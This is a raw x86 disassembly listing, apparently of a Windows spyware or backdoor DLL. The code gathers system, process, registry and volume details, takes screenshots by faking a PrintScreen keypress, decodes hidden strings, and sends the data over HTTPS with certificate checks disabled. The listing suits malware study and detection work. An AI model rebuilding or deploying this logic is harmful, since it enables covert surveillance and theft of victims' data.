lea eax [ ebx + edi * 2 ]
push [ esi + 0x28 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add edi eax
add esp 0x14
xor eax eax
inc eax
mov [ ebp - 0x8 ] eax
cmp [ esi + 0x34 ] eax
jbe r-xdata
mov esi [ ebp - 0xc ]
mov [ ebp - 0x8 ] edi
xor edi edi
push r--data
lea eax [ ebx + edi * 2 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov esi [ esi + 0x8 ]
add esp 0xc
add edi eax
test esi esi
jne r-xdata
movzx eax [ esi + eax + 0x2c ]
push eax
lea eax [ ebx + edi * 2 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add edi eax
add esp 0xc
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ esi + 0x34 ]
jb r-xdata
sub_10003f71
push ebp
mov ebp esp
sub esp 0xc0
push ebx
push 0x98
lea eax [ ebp - 0x98 ]
push 0x0
push eax
call sub_10003398
add esp 0xc
mov [ ebp - 0x9c ] 0x9c
lea eax [ ebp - 0x9c ]
push eax
call [ GetVersionExA@IAT ]
lea eax [ ebp - 0xc0 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x98 ]
xor ecx ecx
mov bl cl
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x94 ]
sub eax ecx
je r-xdata
sub eax 0x1
je r-xdata
mov bl 0x1
sub eax 0x1
je r-xdata
cmp [ ebp - 0x2 ] 0x1
mov eax [ ebp - 0x94 ]
jne r-xdata
sub eax 0x4
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x1
jne r-xdata
sub eax ecx
je r-xdata
sub eax ecx
je r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x2 ] 0x1
sete bl
add bl 0xf
jmp r-xdata
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
mov bl 0xb
jmp r-xdata
sub eax 0x1
je r-xdata
mov bl 0x7
jmp r-xdata
sub eax 0x1
je r-xdata
test [ ebp - 0x4 ] 0x8000
je r-xdata
cmp [ ebp - 0xc0 ] 0x9
jne r-xdata
mov bl 0xc
jmp r-xdata
sub eax 0x1
je r-xdata
mov bl 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xd
jmp r-xdata
sub eax 0x1
jne r-xdata
push ecx
push 0x3
push 0x6
mov bl 0x9
call sub_10003d26
add esp 0xc
test al al
je r-xdata
sub eax 0x1
jne r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_100040b8
push ebp
mov ebp esp
sub esp 0x128
push ebx
push esi
push edi
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
mov [ ebp - 0x128 ] 0x128
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32First
mov ebx edi
lea eax [ ebp - 0x104 ]
push eax
call sub_10002ed5
inc eax
pop ecx
add ebx eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10003ba2
pop ecx
mov ebx eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32First
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebx + edi ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
add edi eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_1000415f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push 0x2b
push r--data
call sub_100031d3
pop ecx
pop ecx
mov esi eax
xor ebx ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
push esi
push 0x80000002
call [ RegOpenKeyExA@IAT ]
push esi
call j_sub_10003b81
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
push ebx
push ebx
push ebx
mov ebx r--data
push ebx
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x4 ]
call sub_10003ba2
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
push 0x0
push ebx
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100041da
push ebp
mov ebp esp
push ecx
xor ecx ecx
lea eax [ ebp - 0x4 ]
push ecx
push ecx
push ecx
push ecx
push eax
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] ecx
call [ GetVolumeInformationW@IAT ]
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_100041fb
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
mov esi [ keybd_event@IAT ]
xor ebx ebx
push edi
xor edi edi
inc ebx
push edi
push ebx
push 0x45
push 0x2c
call esi
push 0x3e8
call [ Sleep@IAT ]
push edi
push 0x3
push 0x45
push 0x2c
call esi
push edi
call [ OpenClipboard@IAT ]
push 0x2
call [ GetClipboardData@IAT ]
mov esi eax
call [ CloseClipboard@IAT ]
test esi esi
jne r-xdata
push edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ebx
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] edi
push eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
call GdiplusStartup
lea eax [ ebp - 0x30 ]
push eax
push r--data
call sub_10003c80
pop ecx
pop ecx
test al al
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x8 ]
call GdiplusShutdown
mov eax edi
push edi
push esi
call sub_10003c5f
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push edi
call [ CreateStreamOnHGlobal@IAT ]
push edi
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x4 ]
push [ esi + 0x4 ]
call GdipSaveImageToStream
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push ebx
call [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
call [ IStream_Size@IAT ]
mov eax [ ebp + 0x8 ]
mov esi [ ebp - 0x10 ]
push [ ebp - 0x4 ]
mov [ eax ] esi
call [ IStream_Reset@IAT ]
push esi
call sub_10003ba2
pop ecx
push esi
mov edi eax
push edi
push [ ebp - 0x4 ]
call [ IStream_Read@IAT ]
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ecx ]
call [ edx + 0x8 ]
mov [ esi + 0x8 ] eax
sub_100042ff
push ebx
push esi
push 0x4
mov esi ecx
call sub_10003b6a
xor ebx ebx
pop ecx
test eax eax
je r-xdata
mov eax ebx
mov ecx eax
call sub_100039e6
jmp r-xdata
push 0x14
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_10003ba2
pop ecx
mov [ esi + 0x18 ] eax
mov eax esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bx
mov [ esi + 0x22 ] bl
pop esi
pop ebx
retn
sub_10004347
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x5
mov esi ecx
xor edi edi
pop ecx
mov ebx edi
mov [ ebp - 0x4 ] ecx
add ebx 0x4
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ edx ]
mov ecx edx
push 0x1
call [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
mov edx [ ebx + eax ]
test edx edx
je r-xdata
push [ esi + 0x8 ]
call j_sub_10003b81
push [ esi + 0x18 ]
call j_sub_10003b81
push [ esi + 0x4 ]
call j_sub_10003b81
add esp 0xc
cmp [ esi + 0x10 ] edi
jbe r-xdata
push [ esi + 0xc ]
call j_sub_10003b81
mov esi [ esi ]
pop ecx
test esi esi
je r-xdata
mov eax [ esi + 0xc ]
push [ eax + edi * 4 ]
call j_sub_10003b81
inc edi
pop ecx
cmp edi [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_100039f2
push esi
call sub_10003b81
pop ecx
sub_100043d0
push esi
push edi
mov edi ecx
xor esi esi
pop edi
pop esi
retn
call sub_100061f8
inc esi
cmp si 0x5
jb r-xdata
mov eax [ edi + 0x18 ]
movzx edx si
mov ecx [ eax + edx * 4 ]
test ecx ecx
je r-xdata
sub_100043f2
push ebp
mov ebp esp
push esi
mov esi [ InternetCloseHandle@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push [ edi + 0x8 ]
call esi
push [ edi + 0x4 ]
call esi
push [ edi ]
call esi
pop edi
pop esi
pop ebp
retn
sub_10004412
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov [ ebp - 0x18 ] edi
call sub_10004dc5
push 0x3
pop esi
push ebx
push ebx
test eax eax
mov edx ebx
push eax
cmovne edx esi
push edx
push [ edi + 0x4 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push esi
push ebx
push ebx
push 0x1bb
push [ edi + 0x8 ]
mov [ ebp - 0x1c ] eax
push eax
call [ InternetConnectA@IAT ]
mov esi eax
mov ecx edi
mov [ ebp - 0x10 ] esi
call sub_10004e23
mov ecx edi
mov [ ebp - 0x8 ] eax
call sub_10004e15
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10004a82
push 0x4
push r--data
mov edi eax
call sub_100031d3
pop ecx
pop ecx
push ebx
push 0x800000
push ebx
push ebx
push ebx
push edi
mov esi eax
push esi
push [ ebp - 0x10 ]
call [ HttpOpenRequestA@IAT ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
push ecx
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x4
push ecx
push 0x1f
push eax
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x4 ] 0x3180
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1f
push [ ebp - 0x8 ]
call [ InternetSetOptionA@IAT ]
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
push [ ebp + 0xc ]
call sub_10002ed5
mov esi [ ebp - 0x8 ]
add esp 0xc
push eax
push [ ebp + 0xc ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] ebx
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
pop edi
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] esi
mov [ ecx ] eax
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x18 ]
push ebx
mov [ ebp + 0xc ] 0x4
mov [ eax + 0x22 ] 0x1
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov ebx [ ebp - 0xc ]
push eax
push ecx
push esi
call sub_1000485a
add esp 0xc
sub_10004551
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
mov ebx ecx
push edi
mov [ ebp - 0x20 ] ebx
call sub_10003f71
mov [ ebp - 0x1 ] al
call sub_10003dc7
mov [ ebp - 0x2 ] al
call sub_100040b8
push eax
mov [ ebp - 0x38 ] eax
call sub_10002ed5
mov esi eax
call sub_10003e2a
push eax
mov [ ebp - 0x34 ] eax
call sub_10002ed5
mov edi eax
mov [ ebp - 0x40 ] edi
call sub_1000415f
push eax
mov [ ebp - 0x30 ] eax
call sub_10002ed5
add esp 0xc
mov [ ebp - 0x44 ] eax
mov ecx ebx
call sub_10004dc5
push eax
mov [ ebp - 0x58 ] eax
call sub_10002ed5
pop ecx
mov ecx ebx
mov [ ebp - 0x18 ] eax
call sub_10004e23
push eax
mov [ ebp - 0x5c ] eax
call sub_10002ed5
pop ecx
mov ecx ebx
mov [ ebp - 0x1c ] eax
call sub_10004e15
push eax
mov [ ebp - 0x64 ] eax
call sub_10002ed5
mov ebx eax
mov [ esp ] r--data
mov [ ebp - 0x60 ] ebx
call sub_10002ed5
add eax ebx
add eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
push 0x5
push r--data
mov [ ebp - 0x48 ] eax
call sub_100031d3
push eax
mov [ ebp - 0x2c ] eax
call sub_10002ed5
push 0x6
push r--data
mov [ ebp - 0x54 ] eax
call sub_100031d3
push eax
mov [ ebp - 0x28 ] eax
call sub_10002ed5
push 0x6
push r--data
mov [ ebp - 0x50 ] eax
call sub_100031d3
push eax
mov [ ebp - 0x24 ] eax
call sub_10002ed5
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_100041fb
add esp 0x2c
mov [ ebp - 0x3c ] eax
xor ebx ebx
and [ ebp - 0x8 ] ebx
xor edx edx
and [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x44 ]
add ebx 0x12
add eax [ ebp - 0x48 ]
add eax edx
add eax ebx
add eax [ ebp - 0x4c ]
add eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
add eax edi
add eax esi
push eax
call sub_10003ba2
mov ebx eax
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push ebx
call sub_10003373
push 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
call sub_10003373
push esi
push [ ebp - 0x38 ]
lea eax [ ebx + 0x2 ]
push eax
call sub_10003373
mov eax [ ebp - 0x34 ]
add esp 0x28
add esi 0x2
test eax eax
je r-xdata
cmp [ ebp - 0xc ] edx
jbe r-xdata
push [ ebp - 0x30 ]
mov edi [ wsprintfA@IAT ]
lea eax [ esi + ebx ]
push [ ebp - 0x2c ]
push r--data
push eax
call edi
push 0x568e8091
push [ ebp - 0x28 ]
add esi eax
mov [ ebp - 0x6c ] 0x3073250a
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x68 ] 0x782578
push eax
lea eax [ esi + ebx ]
push eax
call edi
add esi eax
add esp 0x20
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
test edi edi
jle r-xdata
push [ ebp - 0xc ]
push eax
call sub_10003024
mov edi eax
push edi
mov [ ebp - 0x8 ] edi
call sub_10002ed5
push [ ebp - 0x3c ]
mov ebx eax
mov [ ebp - 0x10 ] ebx
call j_sub_10003b81
push 0x4
push r--data
call sub_100031d3
push eax
mov [ ebp - 0x14 ] eax
call sub_10002ed5
mov edi [ ebp - 0x40 ]
add esp 0x1c
mov edx eax
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
push [ ebp - 0x24 ]
lea eax [ esi + ebx ]
push r--data
push eax
call edi
add esp 0xc
add esi eax
push edi
push eax
lea eax [ esi + ebx ]
push eax
call sub_10003373
add esp 0xc
add esi edi
cmp [ ebp - 0x1c ] 0x0
jle r-xdata
push [ ebp - 0x58 ]
lea eax [ esi + ebx ]
push r--data
push eax
call edi
add esp 0xc
add esi eax
cmp [ ebp - 0x60 ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea eax [ esi + ebx ]
push r--data
push eax
call edi
add esp 0xc
add esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x64 ]
lea eax [ esi + ebx ]
push r--data
push eax
call edi
add esp 0xc
add esi eax
push 0x1
push r--data
call sub_100031d3
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov esi eax
push ebx
push esi
call sub_10005287
push [ ebp - 0x8 ]
mov edi eax
call j_sub_10003b81
push [ ebp - 0x14 ]
call j_sub_10003b81
push [ ebp - 0x24 ]
call j_sub_10003b81
push esi
call j_sub_10003b81
push ebx
call j_sub_10003b81
push [ ebp - 0x28 ]
call j_sub_10003b81
push [ ebp - 0x2c ]
call j_sub_10003b81
push [ ebp - 0x30 ]
call j_sub_10003b81
push [ ebp - 0x34 ]
call j_sub_10003b81
push [ ebp - 0x38 ]
call j_sub_10003b81
add esp 0x28
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
push [ ebp - 0x14 ]
lea eax [ esi + ebx ]
push r--data
push eax
call edi
push [ ebp - 0x10 ]
add eax esi
push [ ebp - 0x8 ]
add eax ebx
push eax
call sub_10003373
add esp 0x18
sub_1000485a
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
push [ ebp + 0x10 ]
lea esi [ eax + 0x1 ]
call sub_10002ed5
pop ecx
push esi
push [ ebp + 0xc ]
mov esi [ InternetSetOptionA@IAT ]
lea edi [ eax + 0x1 ]
push 0x2b
push [ ebp + 0x8 ]
call esi
push edi
push [ ebp + 0x10 ]
push 0x2c
push [ ebp + 0x8 ]
call esi
pop edi
pop esi
pop ebp
retn
sub_10004897
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
call sub_10004dc5
push 0x3
pop ebx
push edi
push edi
test eax eax
mov ecx edi
push eax
cmovne ecx ebx
push ecx
push [ esi + 0x4 ]
call [ InternetOpenA@IAT ]
push edi
push edi
push ebx
push edi
push edi
push 0x1bb
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push eax
call [ InternetConnectA@IAT ]
mov ecx esi
mov ebx eax
call sub_10004e23
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10004e15
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push edi
push 0x800000
push edi
push edi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001e93
pop ecx
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x10 ]
push edi
push edi
push esi
call [ HttpSendRequestA@IAT ]
mov ecx edi
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] esi
cmp ecx 0xc8
jne r-xdata
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] 0x4
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov ecx [ ebp - 0x4 ]
push eax
push ecx
push ebx
call sub_1000485a
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call sub_100043f2
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
push 0x10000
mov ebx edi
mov [ ebp + 0x10 ] edi
call sub_10002b17
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea ecx [ ebp + 0x10 ]
push ecx
push 0x10000
push eax
push esi
call [ InternetReadFile@IAT ]
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp + 0x8 ]
mov [ eax ] ebx
call sub_10002c4c
pop ecx
add eax ebx
push eax
push edi
call sub_10002c6a
push [ ebp + 0x10 ]
mov edi eax
push [ ebp + 0x8 ]
lea ecx [ ebx + edi ]
push ecx
call sub_10003373
add ebx [ ebp + 0x10 ]
add esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
sub_100049f0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x1c ]
push ebx
push esi
push edi
and [ eax ] 0x0
mov edi ecx
mov [ ebp - 0x4 ] edi
call sub_10004dc5
mov ecx edi
mov esi eax
call sub_10004e23
mov ecx edi
mov ebx eax
call sub_10004e15
mov edx eax
lea edi [ ebp - 0x2c ]
push 0x3
pop ecx
push 0x0
pop eax
test esi esi
push 0x9
cmovne eax ecx
mov [ ebp - 0x8 ] eax
xor eax eax
pop ecx
[ edi ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x1c ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x1c ] edx
call sub_10001908
pop ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_10004a82
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
push 0x401
mov edi ecx
call sub_10003ba2
push 0xd
push r--data
mov [ ebp - 0x10 ] eax
call sub_100031d3
mov ecx [ edi ]
add esp 0xc
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x5
push 0x6
call sub_10003a60
push 0x7
push 0x1
mov [ ebp - 0xc ] eax
call sub_10003a46
pop ecx
pop ecx
mov ecx [ edi ]
push eax
call sub_10003ad9
push 0x7
push 0x0
mov [ ebp - 0x8 ] eax
call sub_10003a46
push 0x3
push 0x1
mov esi eax
call sub_10003a46
mov ecx [ edi ]
add esp 0x10
push eax
call sub_10003ad9
push 0x0
push ebx
mov [ ebp - 0x4 ] eax
call sub_10002ed5
pop ecx
push eax
push ebx
call sub_10003225
imul ecx esi 0x12
mov ebx eax
push 0x12
add ecx r--data
push ecx
call sub_100031d3
push 0xe
push r--data
mov edi eax
call sub_100031d3
push ebx
push [ ebp - 0x4 ]
mov esi eax
push edi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push esi
push [ ebp - 0x10 ]
call [ wsprintfA@IAT ]
push esi
call j_sub_10003b81
push edi
call j_sub_10003b81
add esp 0x40
push ebx
call j_sub_10003b81
push [ ebp - 0x4 ]
call j_sub_10003b81
push [ ebp - 0x8 ]
call j_sub_10003b81
push [ ebp - 0xc ]
call j_sub_10003b81
push [ ebp - 0x14 ]
call j_sub_10003b81
add esp 0x14
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10004b7e
push ebp
mov ebp esp
sub esp 0x18
push esi
push [ ebp + 0x8 ]
xor esi esi
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
call sub_10004412
cmp eax 0xc8
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_100043f2
pop ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] 0x4
mov [ ebp + 0x8 ] esi
cmp [ ebp - 0x10 ] esi
je r-xdata
push esi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x20000005
push [ ebp - 0x10 ]
call [ HttpQueryInfoA@IAT ]
cmp [ ebp + 0x8 ] 0x24
jbe r-xdata
push edi
push [ ebp + 0x8 ]
call sub_10003ba2
mov [ ebp - 0x8 ] eax
mov edi esi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x8 ]
pop ecx
push 0x0
cmp edi eax
mov edi [ ebp - 0x8 ]
pop esi
jne r-xdata
cmp edi eax
jb r-xdata
push edi
call j_sub_10003b81
pop ecx
pop edi
push [ ebp + 0xc ]
push eax
push edi
call sub_100030fd
add esp 0xc
mov esi eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
lea eax [ edi + esi ]
push eax
push [ ebp - 0x10 ]
call [ InternetReadFile@IAT ]
add edi [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
sub_10004c41
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x4 ] esi
call sub_10004a82
push 0x4
push r--data
mov [ ebp - 0x14 ] eax
call sub_100031d3
pop ecx
pop ecx
mov ecx esi
mov [ ebp - 0x10 ] eax
call sub_10004dc5
mov ecx esi
mov ebx eax
call sub_10004e23
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_10004e15
mov esi eax
lea edi [ ebp - 0x38 ]
push 0x3
pop eax
xor edx edx
test ebx ebx
push 0x9
cmovne edx eax
xor eax eax
pop ecx
[ edi ]
mov ecx [ ebp - 0x4 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x28 ] esi
mov esi [ ebp - 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x3c ] eax
mov eax [ ecx + 0x8 ]
xor ecx ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] ecx
call sub_10001807
push esi
mov ebx eax
call j_sub_10003b81
push edi
call j_sub_10003b81
mov edi [ ebp - 0x4 ]
add esp 0x10
xor esi esi
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
cmp [ ebx ] 0x32
jne r-xdata
push [ ebp + 0xc ]
mov [ edi + 0x22 ] 0x1
push [ ebp - 0x8 ]
push ebx
call sub_100030fd
add esp 0xc
mov esi eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x22 ] 0x1
push ebx
mov [ eax ] esi
call sub_10002c4c
pop ecx
mov ebx esi
sub_10004d38
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0xc
push r--data
mov esi ecx
call sub_100031d3
push 0x2
push r--data
mov edi eax
call sub_100031d3
add esp 0x10
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
push eax
push edi
call sub_10004f3e
push [ ebp - 0x8 ]
mov ecx esi
mov [ ebp - 0x10 ] eax
push edi
push [ ebp - 0x4 ]
push eax
call sub_10005350
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
push [ ebp - 0x10 ]
call sub_10002c4c
push edi
call j_sub_10003b81
push [ ebp - 0x8 ]
call j_sub_10003b81
add esp 0xc
mov al bl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x8 ] ebx
je r-xdata
mov [ esi + 0x8 ] eax
mov bl 0x1
push [ esi + 0x8 ]
call sub_10002c4c
mov eax [ ebp - 0xc ]
pop ecx
sub_10004dd3
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov eax ecx
xor ebx ebx
push edi
mov [ ebp - 0x4 ] eax
mov esi ebx
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
test al al
mov eax [ ebp - 0x4 ]
jne r-xdata
mov [ eax + 0x1c ] edi
mov bl 0x1
inc esi
cmp si 0x5
jb r-xdata
mov eax [ eax + 0x18 ]
movzx edx si
mov edi [ eax + edx * 4 ]
test edi edi
je r-xdata
jmp r-xdata
sub_10004e31
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x43
push r--data
xor edi edi
call sub_100031d3
and [ ebp - 0x4 ] edi
mov esi eax
mov ebx [ RegOpenKeyExA@IAT ]
lea eax [ ebp - 0x4 ]
pop ecx
pop ecx
push eax
push 0x1
push edi
push esi
push 0x80000002
call ebx
test eax eax
je r-xdata
push esi
call j_sub_10003b81
push 0x6
push r--data
call sub_100031d3
mov esi [ RegQueryValueExA@IAT ]
add esp 0xc
mov ebx eax
xor ecx ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push eax
push ecx
push ecx
push ecx
push ebx
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push edi
push esi
push 0x80000001
call ebx
push ebx
call j_sub_10003b81
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x8 ]
call sub_10003ba2
pop ecx
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push 0x0
push 0x0
push ebx
push [ ebp - 0x4 ]
call esi
push 0x8
call sub_10003ba2
mov esi eax
push 0x2c
push r--data
